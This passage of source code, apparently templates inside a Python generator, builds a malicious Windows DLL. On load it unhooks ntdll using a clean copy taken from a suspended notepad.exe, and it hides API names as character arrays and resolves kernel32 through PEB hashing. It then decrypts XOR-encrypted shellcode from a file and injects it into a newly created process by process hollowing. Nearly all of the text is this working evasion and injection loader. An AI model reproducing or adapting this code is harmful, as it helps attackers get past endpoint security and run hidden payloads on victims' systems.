                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    WORD syscall = (high << 8) | low;
                    return pFunctionAddress;
                    break;
                }
                cw++;
            }
        }
    }
    return funcAddress;
}

DWORD protectingMe(PVOID textBase, DWORD flProtect, SIZE_T size)
{
    UINT64 kernel32dll;
    DWORD oldprotect = NULL;

    CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
    CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
    kernel32dll = GetKernel32();
    LoadLibraryA_t LoadLibraryAFunc = (LoadLibraryA_t)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
    HMODULE ntdlldll = LoadLibraryAFunc("ntdll.dll");

    NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);

    NtProtectVirtualMemoryFunc(NtCurrentProcess(), &textBase, (PULONG)&size, flProtect, &oldprotect);
    return oldprotect;
}

void WhatsOverwriting(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PIMAGE_SECTION_HEADER textsection)
{
    UINT64 msvcrtdll, LoadLibraryAFunc, kernel32dll;
    kernel32dll = GetKernel32();
    CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
    CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0x00 };

    LoadLibraryAFunc = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);
    msvcrtdll = (UINT64)((LoadLibraryA_t)LoadLibraryAFunc)(msvcrt_c);


    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < hooked_pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (strstrFunc(pczFunctionName, (CHAR*)"Nt") != NULL)
        {
            PVOID funcAddress = GetTableEntry(freshntDllBase, pImageExportDirectory, pczFunctionName);
            if (funcAddress != 0x00 && my_strcmp((CHAR*)"NtAccessCheck", pczFunctionName) != 0)
            {
                //Change the write permissions of the .text section of the ntdll in memory
                DWORD oldprotect = protectingMe((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), PAGE_EXECUTE_WRITECOPY, textsection->Misc.VirtualSize);
                //Copy the syscall stub from the fresh ntdll.dll to the hooked ntdll
                CopyMemoryEx((LPVOID)pFunctionAddress, (LPVOID)funcAddress, 23);
                //Change back to the old permissions
                protectingMe((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), oldprotect, textsection->Misc.VirtualSize);
            }
        }
    }
}

void SomeReplacing(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_SECTION_HEADER textsection)
{
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

    if (!GetImageExportDirectory(freshntDllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        {}
        
    
        

    PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(ntdllBase, &hooked_pImageExportDirectory) || hooked_pImageExportDirectory == NULL)
    {}

    WhatsOverwriting(ntdllBase, freshntDllBase, hooked_pImageExportDirectory, pImageExportDirectory, textsection);
}




extern "C" void exec() {

    // Function names
    CHAR NtAllocateVirtualMemory_c[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
    CHAR NtProtectVirtualMemory_c[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
    CHAR NtWriteVirtualMemroy_c[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
    CHAR LoadLibraryA_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0x00 };
    CHAR NtReadVirtualMemeory_c[] = { 'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x00 };
    CHAR CreateProcessA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x00 };
    CHAR TerminateProcess_c[] = {'T', 'e', 'r', 'm', 'i', 'n', 'a', 't', 'e','P','r','o','c','e','s','s', 0x00};
    CHAR CloseHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x00 };
    CHAR CreateFileA_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x00 };
    CHAR GetFileSize_c[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'S', 'i', 'z', 'e', 0x00 };
    CHAR ReadFile_c[] = { 'R', 'e', 'a', 'd', 'F', 'i', 'l', 'e', 0x00 };
    CHAR GetThreadContext_c[] = { 'G', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
    CHAR SetThreadContext_c[] = { 'S', 'e', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'C', 'o', 'n', 't', 'e', 'x', 't', 0x00 };
    CHAR ResumeThread_c[] = { 'R', 'e', 's', 'u', 'm', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x00 };
    CHAR Sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0x00 };
    CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0x00 };
    
    NTSTATUS status = NULL;

    UINT64 kernel32dll = GetKernel32();
    //Kernel32 Function
    CreateProcessA_t CreateProcessAFunc = (CreateProcessA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateProcessA_c);
    TerminateProcess_t TerminateProcessFunc = (TerminateProcess_t)GetSymbolAddress((HANDLE)kernel32dll, TerminateProcess_c);
    CloseHandle_t CloseHandleFunc = (CloseHandle_t)GetSymbolAddress((HANDLE)kernel32dll, CloseHandle_c);
    CreateFileA_t CreateFileAFunc = (CreateFileA_t)GetSymbolAddress((HANDLE)kernel32dll, CreateFileA_c);
    GetFileSize_t GetFileSizeFunc = (GetFileSize_t)GetSymbolAddress((HANDLE)kernel32dll, GetFileSize_c);
    ReadFile_t ReadFileFunc = (ReadFile_t)GetSymbolAddress((HANDLE)kernel32dll, ReadFile_c);
    GetThreadContext_t GetThreadContextFunc = (GetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, GetThreadContext_c);
    SetThreadContext_t SetThreadContextFunc = (SetThreadContext_t)GetSymbolAddress((HANDLE)kernel32dll, SetThreadContext_c);
    Sleep_t SleepFunc = (Sleep_t)GetSymbolAddress((HANDLE)kernel32dll, Sleep_c);
    ResumeThread_t ResumeThreadFunc = (ResumeThread_t)GetSymbolAddress((HANDLE)kernel32dll, ResumeThread_c);

    //Nt Functions
    LoadLibraryA_t LoadLibraryAFunc = (LoadLibraryA_t)GetSymbolAddress((HMODULE)kernel32dll, LoadLibraryA_c);
    HMODULE ntdlldll = LoadLibraryAFunc("ntdll.dll");
    NtAllocateVirtualMemory_t NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtAllocateVirtualMemory_c);
    NtProtectVirtualMemory_t NtProtectVirtualMemoryFunc = (NtProtectVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtProtectVirtualMemory_c);
    NtWriteVirtualMemroy_t NtWriteVirtualMemroyFunc = (NtWriteVirtualMemroy_t)GetSymbolAddress((HANDLE)ntdlldll, NtWriteVirtualMemroy_c);
    NtReadVirtualMemory_t NtReadVirtualMemoryFunc = (NtReadVirtualMemory_t)GetSymbolAddress((HANDLE)ntdlldll, NtReadVirtualMemeory_c);

    //msvcrt Function
    wprintf_t wprintfFunc = (wprintf_t)GetSymbolAddress((HANDLE)LoadLibraryAFunc("msvcrt.dll"), wprintf_c);

    // ntdll unhooking
    STARTUPINFO siSuspended;
    PROCESS_INFORMATION piSuspended;
    ZeroMemory(&siSuspended, sizeof(siSuspended));
    siSuspended.cb = sizeof(siSuspended);
    ZeroMemory(&piSuspended, sizeof(piSuspended));

    BOOL flag = CreateProcessAFunc(
        NULL,
        (LPSTR)"notepad.exe",
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        "C:\\\\Windows\\\\System32\\\\",
        (LPSTARTUPINFOA)&siSuspended,
        &piSuspended
    );
    WCHAR createdSuspendedProcess[] = { L'[', L'+', L']', L' ', L'C', L'r', L'e', L'a', L't', L'e', L'd', L' ', L'S', L'u', L's', L'p', L'e', L'n', L'd', L'e', L'd', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's', L'.', L'.',  L'\\n', 0x00 };
    wprintfFunc(createdSuspendedProcess);
    WCHAR findname[] = L"ntdll.dll\\x00";

    PVOID ntdllBase = GetDll(findname);
    
    PIMAGE_DOS_HEADER ImgDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS ImgNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + (ImgDosHeader->e_lfanew));
    IMAGE_OPTIONAL_HEADER OptHeader = (IMAGE_OPTIONAL_HEADER)ImgNTHeaders->OptionalHeader;
    PIMAGE_SECTION_HEADER textsection = IMAGE_FIRST_SECTION(ImgNTHeaders);

    SIZE_T ntdllSize = OptHeader.SizeOfImage;

    LPVOID freshNtdll = NULL;
    status = NtAllocateVirtualMemoryFunc(
        NtCurrentProcess(),
        &freshNtdll,
        NULL,
        &ntdllSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToAllocate[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'a', L'l', L'l', L'o', L'c', L'a', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L' ', L'f', L'o', L'r', L' ', L't', L'h', L'e', L' ', L'u', L'n', L'h', L'o', L'o', L'k', L'i', L'n', L'g', L'.', L'.',  L'\\n', 0x00 };
        wprintfFunc(failedToAllocate);
        return;
    }

    WCHAR AllocatedMemrory[] = { L'[', L'+', L']', L' ', L'A', L'l', L'l', L'o', L'c', L'a', L't', L'e', L'd', L' ', L'v', L'i', L'r', L't', L'u', L'a', L'l', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L' ', L'o', L'f', L' ', L'n', L'o', L't', L'e', L'p', L'a', L'd', L'.', L'e', L'x', L'e',  L'\\n', 0x00 };
    wprintfFunc(AllocatedMemrory);

    DWORD bytesread = NULL;
    status = NtReadVirtualMemoryFunc(
        piSuspended.hProcess,
        ntdllBase,
        freshNtdll,
        ntdllSize,
        &bytesread
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToReadVirtual[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'r', L'e', L'a', L'd', L' ', L'v', L'i', L'r', L't', L'u', L'a', L'l', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\\n', 0x00 };
        wprintfFunc(failedToReadVirtual);
        return;
    }

    SomeReplacing(ntdllBase, freshNtdll, textsection);
    
    TerminateProcessFunc(piSuspended.hProcess, 0);
    CloseHandleFunc(piSuspended.hProcess);
    CloseHandleFunc(piSuspended.hThread);

    WCHAR finishedReplace[] = { L'[', L'+', L']', L' ', L'F', L'i', L'n', L'i', L's', L'h', L'e', L'd', L' ', L'r', L'e', L'p', L'l', L'a', L'c', L'e', L' ', L'n', L't', L'd', L'l', L'l', L' ', L'f', L'r', L'o', L'm', L' ', L's', L'u', L's', L'p', L'e', L'n', L'd', L'e', L'd', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's',  L'\\n', 0x00 };
    wprintfFunc(finishedReplace);

    // Process Hollowing
    HANDLE hFile = CreateFileAFunc(
        "OUTPUT_PLACEHOLDER", // change it to the file name of the encrypted shellcode
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        WCHAR invaliaHandle[] = { L'[', L'-', L']', L' ', L'I', L'n', L'v', L'a', L'l', L'i', L'd', L' ', L'H', L'a', L'n', L'd', L'l', L'e', L' ', L'V', L'a', L'l', L'u', L'e',  L'\\n', 0x00 };
        wprintfFunc(invaliaHandle);
        return;
    }

    SIZE_T fileSize = GetFileSizeFunc(hFile, NULL);

    LPVOID fileData = NULL;
    status = NtAllocateVirtualMemoryFunc(
        NtCurrentProcess(),
        &fileData,
        NULL,
        &fileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (fileData == NULL) {
        WCHAR failedToAllocate[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'a', L'l', L'l', L'o', L'c', L'a', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L' ', L'f', L'o', L'r', L' ', L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L'.',  L'\\n', 0x00 };
        wprintfFunc(failedToAllocate);
        return;
    }

    DWORD BytesRead = NULL;

    flag = ReadFileFunc(
        hFile,
        fileData,
        fileSize,
        &BytesRead,
        NULL
    );
    if (!flag) {
        WCHAR errorReadFile[] = { L'[', L'-', L']', L' ', L'E', L'r', L'r', L'o', L'r', L' ', L'r', L'e', L'a', L'd', L'i', L'n', L'g', L' ', L't', L'h', L'e', L' ', L'f', L'i', L'l', L'e', L'!', L' ',  L'\\n', 0x00 };
        wprintfFunc(errorReadFile);
        return;
    }

    WCHAR readShellcode[] = { L'[', L'+', L']', L' ', L'R', L'e', L'a', L'd', L' ', L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L' ', L'f', L'i', L'l', L'e', L'!',  L'\\n', 0x00 };
    wprintfFunc(readShellcode);

    unsigned char* shellcode = (unsigned char*)fileData;

    STARTUPINFOA si = {
        sizeof(si)
    };
    PROCESS_INFORMATION pi;
    
    flag = CreateProcessAFunc(
        "PROCESS_INJECT_PLACEHOLDER",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        (LPSTARTUPINFOA)&si,
        &pi
    );

    if (!flag) {
        WCHAR errorCreateProcess[] = { L'[', L'-', L']', L' ', L'E', L'r', L'r', L'o', L'r', L' ', L'c', L'r', L'e', L'a', L't', L'i', L'n', L'g', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's', L'.', L'.',  L'\\n', 0x00 };
        wprintfFunc(errorCreateProcess);
        return;
    }

    LPVOID exec = NULL;

    status = NtAllocateVirtualMemoryFunc(
        pi.hProcess,
        &exec,
        NULL,
        &fileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToAllocatememory[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'a', L'l', L'l', L'o', L'c', L'a', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\\n', 0x00 };
        wprintfFunc(failedToAllocatememory);
        return;
    }

    WCHAR allocatedMemory[] = { L'[', L'+', L']', L' ', L'A', L'l', L'l', L'o', L'c', L'a', L't', L'e', L'd', L' ', L'M', L'e', L'm', L'o', L'r', L'y', L'!',  L'\\n', 0x00 };
    wprintfFunc(allocatedMemory);

    XOR(shellcode, fileSize, KEY, sizeof(KEY));
    WCHAR decryptedshellcode[] = { L'[', L'+', L']', L' ', L'D', L'e', L'c', L'r', L'y', L'p', L't', L'e', L'd', L' ', L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L' ', L'f', L'i', L'l', L'e', L'!',  L'\\n', 0x00 };
    wprintfFunc(decryptedshellcode);

    DWORD oldprotect = NULL;

    status = NtProtectVirtualMemoryFunc(
        pi.hProcess,
        &exec,
        (PULONG)&fileSize,
        PAGE_EXECUTE_READWRITE,
        &oldprotect
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToProtect[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'p', L'r', L'o', L't', L'e', L'c', L't', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\\n', 0x00 };
        wprintfFunc(failedToProtect);
        return;
    }
    WCHAR protectedMemory[] = { L'[', L'+', L']', L' ', L'P', L'r', L'o', L't', L'e', L'c', L't', L'e', L'd', L' ', L'M', L'e', L'm', L'o', L'r', L'y', L'!',  L'\\n', 0x00 };
    wprintfFunc(protectedMemory);


    status = NtWriteVirtualMemroyFunc(
        pi.hProcess,
        exec,
        shellcode,
        fileSize,
        NULL
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToWrite[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'w', L'r', L'i', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\\n', 0x00 };
        wprintfFunc(failedToWrite);
        return;
    }

    WCHAR payloadWritten[] = { L'[', L'+', L']', L' ', L'P', L'a', L'y', L'l', L'o', L'a', L'd', L' ', L'w', L'r', L'i', L't', L't', L'e', L'n', L'!',  L'\\n', 0x00 };
    wprintfFunc(payloadWritten);

    CONTEXT CT;
    CT.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContextFunc(pi.hThread, &CT)) {
        WCHAR failedGetThread[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'g', L'e', L't', L' ', L'T', L'h', L'r', L'e', L'a', L'd', L' ', L'C', L'o', L'n', L't', L'e', L'x', L't',  L'\\n', 0x00 };
        wprintfFunc(failedGetThread);
        return;
    }

    CT.Rip = (DWORD64)exec;

    if (!SetThreadContextFunc(pi.hThread, &CT)) {
        WCHAR errorSettingThread[] = { L'[', L'-', L']', L' ', L'E', L'r', L'r', L'o', L'r', L' ', L's', L'e', L't', L't', L'i', L'n', L'g', L' ', L't', L'h', L'r', L'e', L'a', L'd', L' ', L'c', L'o', L'n', L't', L'e', L'x', L't',  L'\\n', 0x00 };
        wprintfFunc(errorSettingThread);
        return;
    }

    WCHAR Sleeping[] = { L'[', L'+', L']', L' ', L'S', L'l', L'e', L'e', L'p', L'i', L'n', L'g', L' ', L'5', L' ', L's', L'e', L'c', L'o', L'n', L'd', L's', L'.', L'.',  L'\\n', 0x00 };
    wprintfFunc(Sleeping);

    SleepFunc(5);

    ResumeThreadFunc(pi.hThread);

    WCHAR success[] = { L'[', L'+', L']', L' ', L'P', L'r', L'o', L'c', L'e', L's', L's', L' ', L'h', L'o', L'l', L'l', L'o', L'w', L'i', L'n', L'g', L' ', L's', L'u', L'c', L'c', L'e', L's', L's', L'f', L'u', L'l', L'!',  L'\\n', 0x00 };
    wprintfFunc(success);

    CloseHandleFunc(hFile);
    CloseHandleFunc(pi.hProcess);
    CloseHandleFunc(pi.hThread);
    return;
}

BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH:
    		exec();
			break;

		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
    }

    return TRUE;
}
"""

function_h = """#include <windows.h>

// kernel32 function
typedef HMODULE(WINAPI* LoadLibraryA_t)(
    LPCSTR ModuleName
);

typedef BOOL(WINAPI* CreateProcessA_t) (
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef BOOL(WINAPI* TerminateProcess_t)(
    HANDLE hProcess,
    UINT uExitCode
);

typedef BOOL(WINAPI* CloseHandle_t)(
  HANDLE hObject
);

typedef HANDLE(WINAPI* CreateFileA_t)(
  LPCSTR                lpFileName,
  DWORD                 dwDesiredAccess,
  DWORD                 dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD                 dwCreationDisposition,
  DWORD                 dwFlagsAndAttributes,
  HANDLE                hTemplateFile
);

typedef DWORD(WINAPI* GetFileSize_t)(
  HANDLE  hFile,
  LPDWORD lpFileSizeHigh
);

typedef BOOL(WINAPI* ReadFile_t)(
  HANDLE       hFile,
  LPVOID       lpBuffer,
  DWORD        nNumberOfBytesToRead,
  LPDWORD      lpNumberOfBytesRead,
  LPOVERLAPPED lpOverlapped
);

typedef BOOL(WINAPI* GetThreadContext_t)(
  HANDLE    hThread,
  LPCONTEXT lpContext
);

typedef BOOL(WINAPI* SetThreadContext_t)(
  HANDLE        hThread,
  const CONTEXT *lpContext
);

typedef DWORD(WINAPI* ResumeThread_t)(
  HANDLE hThread
);

typedef void(WINAPI* Sleep_t)(
  DWORD dwMilliseconds
);

//ntdll function
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PULONG NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemroy_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS(WINAPI* NtReadVirtualMemory_t)(
    HANDLE               ProcessHandle,
    PVOID                BaseAddress,
    PVOID               Buffer,
    ULONG                NumberOfBytesToRead,
    PULONG              NumberOfBytesReaded
);

// msvcrt functions
typedef int(WINAPI* wprintf_t)(
    const wchar_t* format,
    ...
);
"""

addressHunter = """#include <windows.h>
#include <inttypes.h>

#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

#define KERNEL32DLL_HASH 0x6A4ABC5B

//redefine UNICODE_STR struct
typedef struct _UNICODE_STR
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

//redefine PEB_LDR_DATA struct
typedef struct _PEB_LDR_DATA
{
    DWORD dwLength;
    DWORD dwInitialized;
    LPVOID lpSsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

//redefine LDR_DATA_TABLE_ENTRY struct
typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashTableEntry;
    ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

//redefine PEB_FREE_BLOCK struct
typedef struct _PEB_FREE_BLOCK
{
    struct _PEB_FREE_BLOCK* pNext;
    DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

//redefine PEB struct
typedef struct __PEB
{
    BYTE bInheritedAddressSpace;
    BYTE bReadImageFileExecOptions;
    BYTE bBeingDebugged;
    BYTE bSpareBool;
    LPVOID lpMutant;
    LPVOID lpImageBaseAddress;
    PPEB_LDR_DATA pLdr;
    LPVOID lpProcessParameters;
    LPVOID lpSubSystemData;
    LPVOID lpProcessHeap;
    PRTL_CRITICAL_SECTION pFastPebLock;
    LPVOID lpFastPebLockRoutine;
    LPVOID lpFastPebUnlockRoutine;
    DWORD dwEnvironmentUpdateCount;
    LPVOID lpKernelCallbackTable;
    DWORD dwSystemReserved;
    DWORD dwAtlThunkSListPtr32;
    PPEB_FREE_BLOCK pFreeList;
    DWORD dwTlsExpansionCounter;
    LPVOID lpTlsBitmap;
    DWORD dwTlsBitmapBits[2];
    LPVOID lpReadOnlySharedMemoryBase;
    LPVOID lpReadOnlySharedMemoryHeap;
    LPVOID lpReadOnlyStaticServerData;
    LPVOID lpAnsiCodePageData;
    LPVOID lpOemCodePageData;
    LPVOID lpUnicodeCaseTableData;
    DWORD dwNumberOfProcessors;
    DWORD dwNtGlobalFlag;
    LARGE_INTEGER liCriticalSectionTimeout;
    DWORD dwHeapSegmentReserve;
    DWORD dwHeapSegmentCommit;
    DWORD dwHeapDeCommitTotalFreeThreshold;
    DWORD dwHeapDeCommitFreeBlockThreshold;
    DWORD dwNumberOfHeaps;
    DWORD dwMaximumNumberOfHeaps;
    LPVOID lpProcessHeaps;
    LPVOID lpGdiSharedHandleTable;
    LPVOID lpProcessStarterHelper;
    DWORD dwGdiDCAttributeList;
    LPVOID lpLoaderLock;
    DWORD dwOSMajorVersion;
    DWORD dwOSMinorVersion;
    WORD wOSBuildNumber;
    WORD wOSCSDVersion;
    DWORD dwOSPlatformId;
    DWORD dwImageSubsystem;
    DWORD dwImageSubsystemMajorVersion;
    DWORD dwImageSubsystemMinorVersion;
    DWORD dwImageProcessAffinityMask;
    DWORD dwGdiHandleBuffer[34];
    LPVOID lpPostProcessInitRoutine;
    LPVOID lpTlsExpansionBitmap;
    DWORD dwTlsExpansionBitmapBits[32];
    DWORD dwSessionId;
    ULARGE_INTEGER liAppCompatFlags;
    ULARGE_INTEGER liAppCompatFlagsUser;
    LPVOID lppShimData;
    LPVOID lpAppCompatInfo;
    UNICODE_STR usCSDVersion;
    LPVOID lpActivationContextData;
    LPVOID lpProcessAssemblyStorageMap;
    LPVOID lpSystemDefaultActivationContextData;
    LPVOID lpSystemAssemblyStorageMap;
    DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

// main hashing function for ror13
__forceinline DWORD ror13(DWORD d)
{
    return _rotr(d, 13);
}

__forceinline DWORD hash(char* c)
{
    register DWORD h = 0;
    do
    {
        h = ror13(h);
        h += *c;
    } while (*++c);

    return h;
}

// function to fetch the base address of kernel32.dll from the Process Environment Block
UINT64 GetKernel32() {
    ULONG_PTR kernel32dll, val1, val2, val3;
    USHORT usCounter;

    // kernel32.dll is at 0x60 offset and __readgsqword is compiler intrinsic,
    // so we don't need to extract it's symbol
    kernel32dll = __readgsqword(0x60);

    kernel32dll = (ULONG_PTR)((_PPEB)kernel32dll)->pLdr;
    val1 = (ULONG_PTR)((PPEB_LDR_DATA)kernel32dll)->InMemoryOrderModuleList.Flink;
    while (val1) {
        val2 = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.pBuffer;
        usCounter = ((PLDR_DATA_TABLE_ENTRY)val1)->BaseDllName.Length;
        val3 = 0;

        //calculate the hash of kernel32.dll
        do {
            val3 = ror13((DWORD)val3);
            if (*((BYTE*)val2) >= 'a')
                val3 += *((BYTE*)val2) - 0x20;
            else
                val3 += *((BYTE*)val2);
            val2++;
        } while (--usCounter);

        // compare the hash kernel32.dll
        if ((DWORD)val3 == KERNEL32DLL_HASH) {
            //return kernel32.dll if found
            kernel32dll = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)val1)->DllBase;
            return kernel32dll;
        }
        val1 = DEREF(val1);
    }
    return 0;
}

// custom strcmp function since this function will be called by GetSymbolAddress
// which means we have to call strcmp before loading msvcrt.dll
// so we are writing our own my_strcmp so that we don't have to play with egg or chicken dilemma
int my_strcmp(const char* p1, const char* p2) {
    const unsigned char* s1 = (const unsigned char*)p1;
    const unsigned char* s2 = (const unsigned char*)p2;
    unsigned char c1, c2;
    do {
